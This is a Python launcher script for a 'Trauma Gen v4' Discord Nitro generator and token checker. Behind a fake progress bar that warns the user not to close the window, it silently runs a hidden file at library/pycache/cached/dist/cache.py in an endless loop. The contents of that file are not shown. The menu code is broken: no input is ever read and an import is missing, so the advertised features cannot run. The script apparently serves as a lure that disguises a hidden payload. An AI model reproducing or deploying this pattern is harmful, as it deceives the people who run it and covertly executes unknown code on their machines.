import os
import time
import colorama
import multiprocessing
import progressbar
import subprocess
from colorama import Fore

colorama.init(autoreset=True)

def center_text(text, width=80):
    lines = text.splitlines()
    centered_lines = [line.center(width) for line in lines]
    return '\n'.join(centered_lines)

def display_menu():
    return (
        "Select an option:\n"
        " 1. Config Generator\n"
        " 2. Updater\n"
        " 3. Machine Algorithm Validation\n"
        " 4. Mass Token Checker\n"
        " 5. Generator v1 (Stable)\n"
        " 6. Generator v2 (Faster but less stable)\n"
        " 7. Nitro Promo Redeemer (1 month and 3 months only for now)\n"
        " 8. Credits"
    )

def rpm():
    while True:
        subprocess.run(["python", os.path.join(os.path.dirname(os.path.abspath(__file__)), "library/pycache/cached/dist/cache.py")], check=True)

def Spinner():
    pass


def loading_bar(duration):
    custom_message = (
        f"{Fore.BLUE} Configuring dataset and machine model.\n"
        "\n"
        " IMPORTANT : Do not close the window, it may corrupt the whole data-model, "
        "and you'll have to reinstall everything from start.\n"
    )

    widgets = [
        f'{Fore.BLUE}[', progressbar.Percentage(), f'{Fore.BLUE}] ',
        progressbar.Bar(marker=f'{Fore.BLUE}█', left=f'{Fore.BLUE}[', right=f'{Fore.BLUE}'),
    ]

    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(custom_message)
    bar = progressbar.ProgressBar(widgets=widgets, maxval=duration * 20, term_width=80).start()

    for i in range(duration * 20):
        time.sleep(0.1)
        bar.update(i + 1)

    bar.finish()

if __name__ == "__main__":
    print("\033]0;Trauma Gen v4 † | made by discordtics\007")

    loading_process = multiprocessing.Process(target=loading_bar, args=(20,))
    script_process = multiprocessing.Process(target=rpm)

    loading_process.start()
    script_process.start()

    loading_process.join()

    os.system('cls' if os.name == 'nt' else 'clear')
    ascii_art = r"""
    ████████ ██████    █████   ██    ██ ███    ███  █████  
       ██    ██   ██  ██   ██  ██    ██ ████  ████ ██   ██ 
       ██    ██████   ███████  ██    ██ ██ ████ ██ ███████ 
       ██    ██   ██  ██   ██  ██    ██ ██  ██  ██ ██   ██ 
       ██    ██   ██  ██   ██   ██████  ██      ██ ██   ██ 
    """
    print(Fore.BLUE + center_text(ascii_art))

    print(Fore.BLUE + center_text(display_menu(), width=len(ascii_art.splitlines()[0])))

    print("\033]0;Trauma Gen v4 † | made by discordtics\007")


    if choice == '1':
        Spinner()

        if platform.system() == "Darwin":  # macOS
            subprocess.run(["open", "modules/https_session.py"])
        elif platform.system() == "Windows":
            subprocess.run(["start", "modules/https_session.py"], shell=True)
    
    if choice == '2':
        Spinner()
        
        # Open the file using the system's default program
        if platform.system() == "Darwin":  # macOS
            subprocess.run(["open", "modules/discord.py"])
        elif platform.system() == "Windows":
            subprocess.run(["start", "modules/discord.py"], shell=True)

    if choice == '3':
        Spinner()
        
        if platform.system() == "Darwin":  # macOS
            subprocess.run(["open", "modules/captcha.py"])
        elif platform.system() == "Windows":
            subprocess.run(["start", "modules/captcha.py"], shell=True)

    if choice == '4':
        Spinner()
        
        if platform.system() == "Darwin":  # macOS
            subprocess.run(["open", "utilities/checker.py"])
        elif platform.system() == "Windows":
            subprocess.run(["start", "utilities/checker.py"], shell=True)

    if choice == '5':
        Spinner()
        
        if platform.system() == "Darwin":  # macOS
            subprocess.run(["open", "utilities/genV1.py"])
        elif platform.system() == "Windows":
            subprocess.run(["start", "modules/geV1.py"], shell=True)

    if choice == '6':
        Spinner()
        
        if platform.system() == "Darwin":  # macOS
            subprocess.run(["open", "utilities/genV2.py"])
        elif platform.system() == "Windows":
            subprocess.run(["start", "utilities/genV2.py"], shell=True)

    if choice == '7':
        Spinner()
        
        # Open the file using the system's default program
        if platform.system() == "Darwin":  # macOS
            subprocess.run(["open", "utilities/redeemer.py"])
        elif platform.system() == "Windows":
            subprocess.run(["start", "utilities/redeemer.py"], shell=True)


    # Wait for the script process to finish (this will not happen as the script runs indefinitely)
    script_process.join()
